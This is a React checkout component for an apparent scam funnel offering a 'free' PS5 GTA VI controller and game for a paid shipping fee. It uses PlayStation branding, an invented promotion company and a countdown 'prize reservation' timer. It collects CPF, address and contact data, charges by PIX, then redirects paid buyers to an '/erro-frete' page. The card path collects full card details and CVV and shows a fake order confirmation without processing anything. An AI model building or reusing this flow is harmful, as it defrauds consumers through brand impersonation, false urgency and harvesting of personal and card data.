import FunnelButton from "@/components/funnel/FunnelButton";
import { useEffect, useMemo, useRef, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { useNavigate } from "@tanstack/react-router";
import { BUMP_CASE, BUMP_GRIPS, SHIPPING } from "@/lib/quiz-data";
import { getTikTokAttribution, ttIdentify, ttParams, ttTrack } from "@/lib/tiktok";
import { fbIdentify, fbParams, fbTrack, getMetaAttribution } from "@/lib/meta";
import { createPixCharge, getPixStatus } from "@/lib/pix.functions";
import { track, type PayVariant } from "@/lib/ab";
import { GTA_IMAGES as IMG } from "@/lib/gta-assets";
import { PRIZE_PRODUCTS, hasSelectedModel } from "@/lib/prize-products";


const brl = (v: number) => v.toFixed(2).replace(".", ",");
const digits = (v: string) => v.replace(/\D/g, "");

const maskCPF = (v: string) =>
  digits(v)
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

const maskPhone = (v: string) => {
  const d = digits(v).slice(0, 11);
  if (d.length <= 10) return d.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3").trim();
  return d.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3").trim();
};

const maskCEP = (v: string) => digits(v).slice(0, 8).replace(/(\d{5})(\d{1,3})/, "$1-$2");

const maskCard = (v: string) =>
  digits(v)
    .slice(0, 16)
    .replace(/(\d{4})(?=\d)/g, "$1 ")
    .trim();

const maskExp = (v: string) => digits(v).slice(0, 4).replace(/(\d{2})(\d{1,2})/, "$1/$2");

interface Props {
  variant: PayVariant;
  picks: string[];
  onClose: () => void;
}

type Step = 1 | 2 | 3;

const INSTALLMENTS = [1, 2, 3, 4, 6, 10, 12];

export default function Checkout({ variant, picks, onClose }: Props) {
  const selectedPieces = PRIZE_PRODUCTS.filter((product) => picks.includes(product.id));
  const [step, setStep] = useState<Step>(1);
  const [err, setErr] = useState("");
  const [ship, setShip] = useState<string>(SHIPPING[0].id);
  const [bumpCase, setBumpCase] = useState(false);
  const [bumpGrips, setBumpGrips] = useState(false);
  const [paying, setPaying] = useState(false);
  const [pixReady, setPixReady] = useState(false);
  const [copied, setCopied] = useState(false);
  const [done, setDone] = useState(false);
  const [left, setLeft] = useState(600);

  const [f, setF] = useState({
    nome: "",
    email: "",
    cpf: "",
    fone: "",
    cep: "",
    rua: "",
    num: "",
    compl: "",
    bairro: "",
    cidade: "",
    uf: "",
    cardNum: "",
    cardName: "",
    cardExp: "",
    cardCvv: "",
    parc: "1",
  });
  const set = (k: keyof typeof f, v: string) => setF((p) => ({ ...p, [k]: v }));

  const shipOpt = SHIPPING.find((s) => s.id === ship) ?? SHIPPING[0];


  const total = useMemo(
    () => shipOpt.cost + (bumpCase ? BUMP_CASE : 0) + (bumpGrips ? BUMP_GRIPS : 0),
    [shipOpt.cost, bumpCase, bumpGrips],
  );

  const [pedido, setPedido] = useState("");
  const [pixCode, setPixCode] = useState("");
  const [pixImg, setPixImg] = useState<string | null>(null);
  const criarPix = useServerFn(createPixCharge);
  const consultarPix = useServerFn(getPixStatus);
  const pollRef = useRef<number | null>(null);
  const navigate = useNavigate();


  useEffect(() => {
    track("checkout_open", variant);
    ttTrack("InitiateCheckout", ttParams(0, { content_name: "Checkout aberto" }));
    fbTrack("InitiateCheckout", fbParams(0, { content_name: "Checkout aberto" }));
  }, [variant]);

  useEffect(() => {
    const t = window.setInterval(() => setLeft((v) => (v > 0 ? v - 1 : 0)), 1000);
    return () => window.clearInterval(t);
  }, []);

  const timer =
    String(Math.floor(left / 60)).padStart(2, "0") + ":" + String(left % 60).padStart(2, "0");

  useEffect(() => {
    const el = document.querySelector<HTMLElement>(".mst-co");
    if (el) el.scrollTop = 0;
    window.scrollTo({ top: 0, behavior: "auto" });
    const t = window.requestAnimationFrame(() => {
      const e2 = document.querySelector<HTMLElement>(".mst-co");
      if (e2) e2.scrollTop = 0;
      window.scrollTo({ top: 0, behavior: "auto" });
    });
    return () => window.cancelAnimationFrame(t);
  }, [step, pixReady, done]);

  function goto(next: Step) {
    setErr("");
    setStep(next);
    track("checkout_step", variant, { step: next });
    window.scrollTo({ top: 0, behavior: "auto" });
    document.querySelector<HTMLElement>(".mst-co")?.scrollTo({ top: 0 });
  }

  function submitDados() {
    if (f.nome.trim().split(" ").length < 2) return setErr("Digite seu nome completo.");
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(f.email)) return setErr("Digite um e-mail válido.");
    if (digits(f.cpf).length !== 11) return setErr("Digite um CPF válido (11 dígitos).");
    if (digits(f.fone).length < 10) return setErr("Digite um celular com DDD.");
    goto(2);
  }

  function submitEntrega() {
    if (digits(f.cep).length !== 8) return setErr("Digite um CEP válido.");
    if (!f.rua.trim()) return setErr("Digite o endereço.");
    if (!f.num.trim()) return setErr("Digite o número.");
    if (!f.bairro.trim()) return setErr("Digite o bairro.");
    if (!f.cidade.trim()) return setErr("Digite a cidade.");
    if (f.uf.trim().length !== 2) return setErr("Digite o estado (UF).");
    goto(3);
  }

  async function fetchCep(v: string) {
    const d = digits(v);
    if (d.length !== 8) return;
    try {
      const r = await fetch(`https://viacep.com.br/ws/${d}/json/`);
      const j = (await r.json()) as Record<string, string | undefined>;
      if (j["erro"]) return;
      setF((p) => ({
        ...p,
        rua: j["logradouro"] || p.rua,
        bairro: j["bairro"] || p.bairro,
        cidade: j["localidade"] || p.cidade,
        uf: j["uf"] || p.uf,
      }));
    } catch {
      /* CEP manual */
    }
  }

  async function finalizar() {
    setErr("");
    if (!hasSelectedModel(picks)) return setErr("Escolha um modelo de controle antes de continuar.");
    track("payment_attempt", variant, { total, method: variant });

    if (variant === "pix") {
      setPaying(true);
      try {
        const itens = [
          ...selectedPieces.map((piece) => ({ nome: piece.name, valor: 0 })),
          { nome: `Envio rastreado ${shipOpt.id.toUpperCase()}`, valor: shipOpt.cost },
          ...(bumpCase ? [{ nome: "Case protetora para controle PS5", valor: BUMP_CASE }] : []),
          ...(bumpGrips ? [{ nome: "Par de grips para analógicos", valor: BUMP_GRIPS }] : []),
        ];
        const r = await criarPix({
          data: {
            amount: Number(total.toFixed(2)),
            productName: `Controle PS5 GTA VI + Jogo GTA VI (${selectedPieces.map((piece) => piece.name).join(", ")}) - entrega`,
            items: itens,
            variant,
            customer: {
              name: f.nome.trim(),
              email: f.email.trim(),
              cpf: digits(f.cpf),
              phone: digits(f.fone),
            },
            tracking: { ...getTikTokAttribution(""), ...getMetaAttribution() },
            shipping: {
              method: shipOpt.id,
              cep: digits(f.cep),
              rua: f.rua,
              num: f.num,
              compl: f.compl,
              bairro: f.bairro,
              cidade: f.cidade,
              uf: f.uf.toUpperCase(),
            },
          },
        });
        setPaying(false);
        if (!r.ok) return setErr(r.error);
        setPedido(r.orderId);
        try {
          window.localStorage.setItem(
            "mst_pix_pendente",
            JSON.stringify({ order: r.orderId, ship: shipOpt.id, total }),
          );
        } catch {
          /* storage indisponível */
        }
        setPixCode(r.qrCode ?? "");
        setPixImg(r.qrCodeBase64 ?? null);
        setPixReady(true);
        track("pix_generated", variant, { total, pedido: r.orderId });
        void ttIdentify(f.email, f.fone);
        ttTrack("AddPaymentInfo", ttParams(total, { description: "PIX gerado" }), r.orderId);
        fbIdentify(f.email, f.fone);
        fbTrack("AddPaymentInfo", fbParams(total, { description: "PIX gerado" }), r.orderId);
        document.querySelector<HTMLElement>(".mst-co")?.scrollTo({ top: 0 });
      } catch {
        setPaying(false);
        setErr("Não foi possível gerar o PIX. Tente novamente em instantes.");
      }
      return;
    }

    if (digits(f.cardNum).length < 16) return setErr("Número do cartão incompleto.");
    if (f.cardName.trim().length < 3) return setErr("Digite o nome impresso no cartão.");
    if (digits(f.cardExp).length !== 4) return setErr("Validade inválida (MM/AA).");
    if (digits(f.cardCvv).length < 3) return setErr("CVV inválido.");
    setPaying(true);
    window.setTimeout(() => {
      setPaying(false);
      setDone(true);
      track("purchase", variant, { total, pedido, method: "card", parc: f.parc });
    }, 1500);
  }

  // Confirmação automática: o webhook grava o pagamento e o checkout consulta o status.
  useEffect(() => {
    if (!pixReady || !pedido || done) return;
    let alive = true;
    async function check() {
      try {
        const r = await consultarPix({ data: { orderId: pedido } });
        if (!alive) return;
        if (r.status === "approved") {
          setDone(true);
          try {
            window.localStorage.removeItem("mst_pix_pendente");
          } catch {
            /* storage indisponível */
          }
          track("purchase", variant, { total, pedido, method: "pix" });
          // event_id = pedido: o TikTok deduplica com o evento server-side do webhook.
          ttTrack("CompletePayment", ttParams(total, { order_id: pedido }), pedido);
          // event_id = pedido: a Meta deduplica com o Purchase do servidor.
          fbTrack("Purchase", fbParams(total, { order_id: pedido }), pedido);
          void navigate({
            to: "/erro-frete",
            search: { order: pedido, ship: shipOpt.id === "sedex" ? "sedex" : "pac" },
          });
        }
      } catch {
        /* tenta de novo no próximo ciclo */
      }
    }
    void check();
    pollRef.current = window.setInterval(check, 2000);
    const onVisible = () => {
      if (document.visibilityState === "visible") void check();
    };
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      alive = false;
      document.removeEventListener("visibilitychange", onVisible);
      if (pollRef.current) window.clearInterval(pollRef.current);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pixReady, pedido, done]);

  // Se o cliente recarregar a página, retomamos o pedido pendente e levamos ao ajuste de frete.
  useEffect(() => {
    if (pixReady || pedido) return;
    let raw: string | null = null;
    try {
      raw = window.localStorage.getItem("mst_pix_pendente");
    } catch {
      raw = null;
    }
    if (!raw) return;
    let salvo: { order?: string; ship?: string } | null = null;
    try {
      salvo = JSON.parse(raw) as { order?: string; ship?: string };
    } catch {
      salvo = null;
    }
    const ordem = salvo?.order;
    if (!ordem) return;
    let alive = true;
    void consultarPix({ data: { orderId: ordem } })
      .then((r) => {
        if (!alive || r.status !== "approved") return;
        try {
          window.localStorage.removeItem("mst_pix_pendente");
        } catch {
          /* storage indisponível */
        }
        void navigate({
          to: "/erro-frete",
          search: { order: ordem, ship: salvo?.ship === "sedex" ? "sedex" : "pac" },
        });
      })
      .catch(() => undefined);
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);



  async function copyPix() {
    try {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      track("pix_copy", variant, { pedido });
      window.setTimeout(() => setCopied(false), 2600);
    } catch {
      setErr("Não foi possível copiar. Toque e segure o código para copiar.");
    }
  }

  if (done) {
    return (
      <div className="mst-success">
        <div className="mst-success-ico">
          <svg viewBox="0 0 24 24">
            <polyline points="20 6 9 17 4 12" />
          </svg>
        </div>
        <h1 className="mst-h2" style={{ margin: 0 }}>
          Pedido confirmado!
        </h1>
        <p className="mst-sub" style={{ marginBottom: 6 }}>
          Pedido #{pedido}. O envio acontece após o lançamento; o rastreio será enviado por e-mail.
        </p>
        <div className="mst-kicker">Pago R$ {brl(total)}</div>
        <FunnelButton type="button" className="mst-cta" style={{ marginTop: 18 }} onClick={onClose}>
          Voltar ao início
        </FunnelButton>
      </div>
    );
  }

  const ctaLabel =
    step < 3
      ? "Continuar"
      : variant === "pix"
        ? "Gerar PIX de R$ " + brl(total)
        : "Pagar R$ " + brl(total);

  return (
    <div className="mst-co" role="dialog" aria-label="Checkout do resgate">
      <div className="mst-co-head">
        <FunnelButton
          type="button"
          className="mst-co-back"
          aria-label="Voltar"
          onClick={() => (step === 1 || pixReady ? onClose() : goto((step - 1) as Step))}
        >
          <svg viewBox="0 0 24 24" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12" />
            <polyline points="12 19 5 12 12 5" />
          </svg>
        </FunnelButton>
        <span className="mst-co-brand">
          <img src={IMG.logo} alt="Sony PlayStation" />
          <span>GTA VI</span>
        </span>
        <span className="mst-co-secure">Ambiente seguro</span>
      </div>

      <div className="mst-co-body">
        {pixReady ? (
          <>
            <div className="mst-kicker">Último passo</div>
            <h2 className="mst-h2">
              Finalize seu pedido
              <br />e leve suas <span className="mst-lime">controle + jogo</span>
            </h2>
            <p className="mst-sub">
              O kit controle + jogo custa R$ 0,00. O total inclui a entrega escolhida e os acessórios opcionais selecionados.
            </p>

            <div className="mst-totals">
              <div className="mst-total-row">
                <span>Pedido</span>
                <b>#{pedido}</b>
              </div>
              <div className="mst-total-row">
                <span>{selectedPieces.map((piece) => piece.name).join(" + ")}</span>
                <b className="green">GRÁTIS</b>
              </div>
              <div className="mst-total-row">
                <span>Envio rastreado ({shipOpt.id.toUpperCase()})</span>
                <b>R$ {brl(shipOpt.cost)}</b>
              </div>
              {bumpCase && (
                <div className="mst-total-row">
                  <span>Case protetora para controle</span>
                  <b>R$ {brl(BUMP_CASE)}</b>
                </div>
              )}
              {bumpGrips && (
                <div className="mst-total-row">
                  <span>Grips para analógicos</span>
                  <b>R$ {brl(BUMP_GRIPS)}</b>
                </div>
              )}
              <div className="mst-total-final">
                <span>Total a pagar</span>
                <b>R$ {brl(total)}</b>
              </div>
            </div>

            {pixCode && (
              <>
                <FunnelButton type="button" className="mst-cta" onClick={copyPix}>
                  {copied ? "Código copiado!" : "Copiar código PIX"}
                </FunnelButton>
                <div className="mst-pix-code">{pixCode}</div>
              </>
            )}

            {(pixImg || pixCode) && (
              <div className="mst-qr">
                <img
                  src={
                    pixImg ??
                    `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`
                  }
                  alt="QR Code do PIX para pagamento do envio"
                  width={200}
                  height={200}
                  loading="lazy"
                />
              </div>
            )}

            <ol className="mst-pix-steps">
              <li>Abra o app do seu banco</li>
              <li>Escolha PIX &gt; Pix Copia e Cola</li>
              <li>Cole o código e confirme o pagamento</li>
            </ol>

            {err && <div className="mst-err">{err}</div>}
            <div className="mst-watch">
              Aguardando seu pagamento — a confirmação é automática
            </div>

          </>
        ) : (
          <>
            <div className="mst-steps-nav">
              {["Seus dados", "Entrega", "Pagamento"].map((label, i) => {
                const n = (i + 1) as Step;
                return (
                  <div
                    key={label}
                    className={
                      "mst-step" + (step === n ? " is-on" : step > n ? " is-done" : "")
                    }
                  >
                    <i>{n}</i>
                    <span>{label}</span>
                  </div>
                );
              })}
            </div>

            {step === 1 && (
              <>
                <h2 className="mst-h2">
                  Seus dados
                  <br />
                  <span className="mst-lime">de resgate</span>
                </h2>
                <p className="mst-sub">
                   Seu controle + jogo foram liberados por <b>R$ 0</b> — complete os dados para seguir.
                </p>
                <div className="mst-field">
                  <label htmlFor="co-nome">Nome completo</label>
                  <input
                    id="co-nome"
                    autoComplete="name"
                    value={f.nome}
                    onChange={(e) => set("nome", e.target.value)}
                    placeholder="Como está no documento"
                  />
                </div>
                <div className="mst-field">
                  <label htmlFor="co-email">E-mail</label>
                  <input
                    id="co-email"
                    type="email"
                    inputMode="email"
                    autoComplete="email"
                    value={f.email}
                    onChange={(e) => set("email", e.target.value)}
                    placeholder="para receber o rastreio"
                  />
                </div>
                <div className="mst-grid-2">
                  <div className="mst-field">
                    <label htmlFor="co-cpf">CPF</label>
                    <input
                      id="co-cpf"
                      inputMode="numeric"
                      value={f.cpf}
                      onChange={(e) => set("cpf", maskCPF(e.target.value))}
                      placeholder="000.000.000-00"
                    />
                  </div>
                  <div className="mst-field">
                    <label htmlFor="co-fone">Celular</label>
                    <input
                      id="co-fone"
                      inputMode="tel"
                      autoComplete="tel"
                      value={f.fone}
                      onChange={(e) => set("fone", maskPhone(e.target.value))}
                      placeholder="(00) 00000-0000"
                    />
                  </div>
                </div>
              </>
            )}

            {step === 2 && (
              <>
                <h2 className="mst-h2">
                  Onde entregar
                  <br />
                  <span className="mst-lime">seu controle + jogo</span>
                </h2>

                <div className="mst-kicker" style={{ margin: "0 0 8px" }}>
                  Escolha sua entrega
                </div>
                <div className="mst-ship-note">
                  <svg viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M3 7h11v9H3zM14 10h4l3 3v3h-7z" />
                    <circle cx="7" cy="18" r="1.8" />
                    <circle cx="17.5" cy="18" r="1.8" />
                  </svg>
                  <span>
                    O controle + jogo saem por R$ 0,00 nesta oferta; você paga a entrega. Envio imediato em caixa reforçada, com proteção e rastreamento.
                  </span>
                </div>
                <div className="mst-ship">
                  {SHIPPING.map((s) => (
                    <FunnelButton
                      key={s.id}
                      type="button"
                      className={"mst-ship-row" + (ship === s.id ? " is-on" : "")}
                      onClick={() => setShip(s.id)}
                    >
                      <span className="mst-radio" />
                      <span>
                        <span className="mst-ship-name">{s.name}</span>
                        <span className="mst-ship-eta">
                          {s.eta}
                        </span>
                      </span>
                      <span className="mst-ship-price">
                        {"was" in s && s.was ? <s>R$ {brl(s.was)}</s> : null}R$ {brl(s.cost)}
                      </span>
                    </FunnelButton>
                  ))}
                </div>

                <div className="mst-kicker" style={{ margin: "16px 0 8px" }}>
                  Endereço de entrega
                </div>
                <div className="mst-grid-2">

                  <div className="mst-field">
                    <label htmlFor="co-cep">CEP</label>
                    <input
                      id="co-cep"
                      inputMode="numeric"
                      autoComplete="postal-code"
                      value={f.cep}
                      onChange={(e) => {
                        const v = maskCEP(e.target.value);
                        set("cep", v);
                        void fetchCep(v);
                      }}
                      placeholder="00000-000"
                    />
                  </div>
                  <div className="mst-field">
                    <label htmlFor="co-num">Número</label>
                    <input
                      id="co-num"
                      inputMode="numeric"
                      value={f.num}
                      onChange={(e) => set("num", e.target.value)}
                      placeholder="123"
                    />
                  </div>
                </div>
                <div className="mst-field">
                  <label htmlFor="co-rua">Endereço</label>
                  <input
                    id="co-rua"
                    autoComplete="address-line1"
                    value={f.rua}
                    onChange={(e) => set("rua", e.target.value)}
                    placeholder="Rua, avenida..."
                  />
                </div>
                <div className="mst-grid-2">
                  <div className="mst-field">
                    <label htmlFor="co-compl">Complemento</label>
                    <input
                      id="co-compl"
                      value={f.compl}
                      onChange={(e) => set("compl", e.target.value)}
                      placeholder="Apto, bloco (opcional)"
                    />
                  </div>
                  <div className="mst-field">
                    <label htmlFor="co-bairro">Bairro</label>
                    <input
                      id="co-bairro"
                      value={f.bairro}
                      onChange={(e) => set("bairro", e.target.value)}
                      placeholder="Bairro"
                    />
                  </div>
                </div>
                <div className="mst-grid-2">
                  <div className="mst-field">
                    <label htmlFor="co-cidade">Cidade</label>
                    <input
                      id="co-cidade"
                      value={f.cidade}
                      onChange={(e) => set("cidade", e.target.value)}
                      placeholder="Cidade"
                    />
                  </div>
                  <div className="mst-field">
                    <label htmlFor="co-uf">Estado</label>
                    <input
                      id="co-uf"
                      maxLength={2}
                      value={f.uf}
                      onChange={(e) => set("uf", e.target.value.toUpperCase())}
                      placeholder="UF"
                    />
                  </div>
                </div>



              </>
            )}

            {step === 3 && (
              <>
                <h2 className="mst-h2">
                  Pagamento
                  <br />
                  <span className="mst-lime">do seu resgate</span>
                </h2>

                <FunnelButton
                  type="button"
                  className={"mst-bump" + (bumpCase ? " is-on" : "")}
                  onClick={() => setBumpCase((v) => !v)}
                >
                  <span className="mst-bump-thumb">
                    <img src={IMG.carryingCase} alt="Case protetora para controle PS5" loading="lazy" width={1024} height={1024} />
                  </span>
                  <span>
                    <span className="mst-bump-t">Case protetora para controle</span>
                    <span className="mst-bump-d">Estojo rígido para guardar e transportar</span>
                  </span>
                  <span className="mst-bump-p">
                    R$ {brl(BUMP_CASE)}
                    <span className="mst-chk">
                      <svg viewBox="0 0 24 24">
                        <path d="M20 6 9 17l-5-5" />
                      </svg>
                    </span>
                  </span>
                </FunnelButton>

                <FunnelButton
                  type="button"
                  className={"mst-bump" + (bumpGrips ? " is-on" : "")}
                  onClick={() => setBumpGrips((v) => !v)}
                >
                  <span className="mst-bump-thumb">
                    <img src={IMG.grips} alt="Par de grips para analógicos" loading="lazy" />
                  </span>
                  <span>
                    <span className="mst-bump-t">Grips para analógicos</span>
                    <span className="mst-bump-d">2 capas de silicone para os analógicos</span>
                  </span>
                  <span className="mst-bump-p">
                    R$ {brl(BUMP_GRIPS)}
                    <span className="mst-chk">
                      <svg viewBox="0 0 24 24">
                        <path d="M20 6 9 17l-5-5" />
                      </svg>
                    </span>
                  </span>
                </FunnelButton>

                <div className="mst-totals">
                  <div className="mst-total-row">
                    <span>{selectedPieces.map((piece) => piece.name).join(" + ")}</span>
                    <b className="green">
                      GRÁTIS
                    </b>
                  </div>
                  <div className="mst-total-row">
                    <span>Frete ({shipOpt.id.toUpperCase()})</span>
                    <b>R$ {brl(shipOpt.cost)}</b>
                  </div>
                  {bumpCase && (
                    <div className="mst-total-row">
                      <span>Case protetora para controle</span>
                      <b>R$ {brl(BUMP_CASE)}</b>
                    </div>
                  )}
                  {bumpGrips && (
                    <div className="mst-total-row">
                      <span>Grips para analógicos</span>
                      <b>R$ {brl(BUMP_GRIPS)}</b>
                    </div>
                  )}
                  <div className="mst-total-final">
                    <span>Total a pagar</span>
                    <b>R$ {brl(total)}</b>
                  </div>
                </div>

                {/* ── forma de pagamento definida pelo teste A/B ── */}
                <div className="mst-kicker" style={{ margin: "0 0 8px" }}>
                  Forma de pagamento
                </div>
                <div className="mst-pay-tabs">
                  <div className="mst-pay-tab is-on">
                    {variant === "pix" ? "PIX" : "Cartão de crédito"}
                    <small>
                      {variant === "pix"
                        ? "Aprovação na hora, sem cadastro de cartão"
                        : `Em até ${INSTALLMENTS[INSTALLMENTS.length - 1]}x, aprovação imediata`}
                    </small>
                  </div>
                </div>

                {variant === "card" && (
                  <>
                    <div className="mst-field">
                      <label htmlFor="co-card">Número do cartão</label>
                      <input
                        id="co-card"
                        inputMode="numeric"
                        autoComplete="cc-number"
                        value={f.cardNum}
                        onChange={(e) => set("cardNum", maskCard(e.target.value))}
                        placeholder="0000 0000 0000 0000"
                      />
                    </div>
                    <div className="mst-field">
                      <label htmlFor="co-card-name">Nome impresso no cartão</label>
                      <input
                        id="co-card-name"
                        autoComplete="cc-name"
                        value={f.cardName}
                        onChange={(e) => set("cardName", e.target.value.toUpperCase())}
                        placeholder="COMO ESTÁ NO CARTÃO"
                      />
                    </div>
                    <div className="mst-grid-2">
                      <div className="mst-field">
                        <label htmlFor="co-exp">Validade</label>
                        <input
                          id="co-exp"
                          inputMode="numeric"
                          autoComplete="cc-exp"
                          value={f.cardExp}
                          onChange={(e) => set("cardExp", maskExp(e.target.value))}
                          placeholder="MM/AA"
                        />
                      </div>
                      <div className="mst-field">
                        <label htmlFor="co-cvv">CVV</label>
                        <input
                          id="co-cvv"
                          inputMode="numeric"
                          autoComplete="cc-csc"
                          value={f.cardCvv}
                          onChange={(e) => set("cardCvv", digits(e.target.value).slice(0, 4))}
                          placeholder="000"
                        />
                      </div>
                    </div>
                    <div className="mst-field">
                      <label htmlFor="co-parc">Parcelamento</label>
                      <select
                        id="co-parc"
                        value={f.parc}
                        onChange={(e) => set("parc", e.target.value)}
                      >
                        {INSTALLMENTS.map((n) => (
                          <option key={n} value={String(n)}>
                            {n}x de R$ {brl(total / n)}
                            {n === 1 ? " (à vista)" : " sem juros"}
                          </option>
                        ))}
                      </select>
                    </div>
                  </>
                )}

                {variant === "pix" && (
                  <ol className="mst-pix-steps">
                    <li>Você gera o código PIX aqui</li>
                    <li>Paga no app do seu banco em segundos</li>
                    <li>A confirmação chega no seu e-mail</li>
                  </ol>
                )}

                <div className="mst-selos">
                  <div className="mst-selo-item">
                    <svg viewBox="0 0 24 24" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                      <polyline points="14 2 14 8 20 8" />
                    </svg>
                    Nota fiscal
                    <br />
                    emitida
                  </div>
                  <div className="mst-selo-item">
                    <svg viewBox="0 0 24 24" strokeLinecap="round" strokeLinejoin="round">
                      <rect x="1" y="3" width="15" height="13" />
                      <path d="M16 8h4l3 3v5h-7z" />
                      <circle cx="5.5" cy="18.5" r="2.5" />
                      <circle cx="18.5" cy="18.5" r="2.5" />
                    </svg>
                    Envio após
                    <br />
                    lançamento
                  </div>
                  <div className="mst-selo-item">
                    <svg viewBox="0 0 24 24" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    </svg>
                    30 dias de
                    <br />
                    garantia
                  </div>
                </div>
              </>
            )}

            {err && <div className="mst-err">{err}</div>}

            <p className="mst-company">
              <strong>Playstation &amp; GTA VI · Promoção Brasil Ltda</strong>
              CNPJ - 00.436.042/0008-46
            </p>
          </>
        )}
      </div>

      {!pixReady && (
        <div className="mst-bar-fixed">
          <div className="mst-bar-in">
            <div className="mst-bar-top">
              <span>Reserva do prêmio</span>
              <b>{timer}</b>
            </div>
            <div className="mst-bar-act">
              <span className="mst-bar-tot">
                 <span>{step === 3 ? "Total" : "Seu kit"}</span>
                <b>{step === 3 ? `R$ ${brl(total)}` : "GRÁTIS"}</b>
              </span>
              <FunnelButton
                type="button"
                className="mst-cta"
                disabled={paying}
                onClick={() =>
                  step === 1 ? submitDados() : step === 2 ? submitEntrega() : finalizar()
                }
              >
                {paying ? "Processando..." : ctaLabel}
              </FunnelButton>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
